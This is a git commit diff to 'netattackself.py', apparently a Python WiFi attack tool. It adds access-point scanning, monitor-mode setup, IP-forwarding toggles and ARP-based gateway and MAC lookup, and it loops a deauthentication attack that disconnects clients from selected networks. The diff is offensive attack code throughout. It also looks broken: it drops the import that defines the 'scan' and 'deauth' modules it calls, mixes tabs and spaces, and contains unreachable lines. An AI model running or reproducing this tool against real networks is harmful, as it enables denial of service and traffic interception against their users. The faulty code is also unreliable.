9abc050055315a7a5f1d37b78c35c38a59d86847
yo-it <41968686+yo-it@users.noreply.github.com>
2018-08-01 08:43:55 +0200

    Update netattackself.py

--- netattackself.py
+++ netattackself.py
@@ -11,7 +11,7 @@ from threading import Thread
 from time import sleep
 import datetime
 import logging
-from src import *
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # scapy, please shut up..
 
 # terminal colors
@@ -22,6 +22,33 @@ GREEN = "\033[1;32m"
 YELLOW = "\33[1;93m"
 NORMAL = "\033[0;0m"
 BOLD = "\033[;1m"
+
+def wifi_scan():
+    '''
+    This will perform a basic Access-Point scan.
+    Informations like WPS, Encryption, Signal Strength, ESSID, ... will be shown for every available AP.
+    The function uses 'scan.py' located in the local 'build' folder.
+    '''
+
+    interface = get_interface()
+    enable_mon_mode(interface)
+
+    wifiscan = scan.WifiScan(interface)
+    wifiscan.do_output = True
+
+    hopT = Thread(target=wifiscan.channelhop, args=[])
+    hopT.daemon = True
+    hopT.start()
+
+    # This decay is needed to avoid issues concerning the Channel-Hop-Thread
+    sleep(0.2)
+    
+    try:
+        wifiscan.do_scan()
+    except socket.error:
+        print("{R}ERROR: Network-Interface is down.{N}".format(R=RED, N=NORMAL))
+	sys.exit(0)
+
 
 def get_interface():
    
@@ -58,7 +85,47 @@ def enable_mon_mode(interface):
     except Exception:
         sys.exit("\n{R}ERROR: Not able to activate monitor mode on selected interface.{N}\n".format(R=RED, N=NORMAL))
 
-def deauth():
+def enable_ip_forwarding():
+    ipfwd = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+    ipfwd.write('1\n')
+    ipfwd.close()
+
+def disable_ip_forwarding():
+    ipfwd = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+    ipfwd.write('0\n')
+    ipfwd.close()
+
+def get_gateway_ip():
+    # get the 'default' gateway
+
+    try:
+        return netifaces.gateways()['default'][netifaces.AF_INET][0]
+    except KeyError:
+        print("\n{R}ERROR: Unable to retrieve gateway IP address.\n{N}".format(R=RED, N=NORMAL))
+        return raw_input("Please enter gateway IP address manually: ")
+
+def get_local_ip(interface):
+    try:
+        local_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
+        if local_ip == "127.0.0.1" or local_ip == "ff:ff:ff:ff:ff:ff":
+            sys.exit("\n{R}ERROR: Invalid network interface.{N}\n".format(R=RED, N=NORMAL))
+        return local_ip
+    except KeyError:
+        print("\n{R}ERROR: Unable to retrieve local IP address.{N}\n")
+        return raw_input("Please enter your local IP address manually: ")
+
+def get_mac_by_ip(ipaddr):
+    # get the MAC by sending ARP packets to the desired IP
+
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ipaddr), retry=2, timeout=7)
+    for snd, rcv in ans:
+        try:
+            return rcv[Ether].src
+        except KeyError:
+            print("\n{R}ERROR: Unable to retrieve MAC address from IP address: {N}{ip}\n".format(R=RED, N=NORMAL, ip=ipaddr))
+            return raw_input("Please enter MAC address manually: ")
+        
+def deauth_attack():
 		while True:
 			interface = get_interface()
 			enable_mon_mode(interface)
@@ -119,26 +186,28 @@ def deauth():
 			printings.deauth_ap()
 
 			ap_list = {}
-			
-			print("\n")
+
 			for bssid in access_points:
-                        	for num in ap_list_in:
-            				if int(num) == access_points[bssid]["num"]:
-                				print(" ->   {bssid} | {essid}".format(bssid=bssid.upper(), essid=access_points[bssid]["essid"]))
-                				ap_list[bssid] = access_points[bssid]["ch"]
+					for num in ap_list_in:
+							if int(num) == access_points[bssid]["num"]:
+									print(" ->   {bssid} | {essid}".format(bssid=bssid.upper(), essid=access_points[bssid]["essid"]))
+									ap_list[bssid] = access_points[bssid]["ch"]
 
 			print("\n")
+
 			deauthent = deauth.Deauth(ap_list, interface)
 			deauthent.start_deauth()
+		sleep(120)
 
-
-def main():   
+def main():
+    # Signal handler to catch KeyboardInterrupts
     def signal_handler(signal, frame):
         print("")
         sys.exit(0)
 
     signal.signal(signal.SIGINT, signal_handler)
-    deauth()
+
+    deauth_attack()
 
 if __name__ == "__main__":
-    main()
+main()
